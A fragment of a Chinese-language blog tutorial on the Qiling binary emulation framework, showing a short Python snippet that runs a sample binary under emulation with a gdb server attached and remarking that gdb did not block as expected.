-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">&#x27;examples/rootfs/x8664_linux/bin/AnokhREV&#x27;</span>],<span class="string">&#x27;examples/rootfs/x8664_linux&#x27;</span>,output=<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">    ql.gdb = <span class="string">&#x27;0.0.0.0:9999&#x27;</span></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>
-<p>这个例子不知道为何跑起来之后gdb并没有阻塞</p>
-<ol start="4">
-<li>qltool例子</li>
-</ol>
 
       
     </div>
